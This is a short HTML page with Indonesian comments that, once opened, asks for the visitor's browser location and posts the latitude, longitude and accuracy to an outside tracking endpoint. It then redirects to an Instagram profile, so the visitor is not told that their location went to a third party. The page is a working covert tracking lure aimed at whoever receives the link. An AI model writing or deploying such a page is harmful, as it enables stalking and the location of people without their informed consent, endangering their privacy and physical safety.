<!DOCTYPE html>
<html>
  <head>
    <title>kiw</title>
  </head>
  <body>
    <script>
      window.onload = getLocation; // Panggil getLocation otomatis saat halaman dimuat

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(sendPosition, handleError);
        } else {
          alert("Geolocation tidak didukung oleh browser Anda.");
        }
      }

      const randomId = "id-" + Math.random().toString(36).substring(2, 10);

      function sendPosition(position) {
        const data = {
          id: randomId,
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };

        fetch("https://tracking-lemon.vercel.app/track", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        })
          .then(() => {
            // Setelah data berhasil dikirim, arahkan ke URL tujuan
            window.location.href = "https://instagram.com/ilhamrhmddni";
          })
          .catch(() => {
            // Gagal kirim data, tidak ada aksi tambahan
          });
      }

      function handleError(error) {
        alert(
          "Gagal mendapatkan lokasi. Pastikan Anda mengizinkan akses lokasi."
        );
      }
    </script>
  </body>
</html>
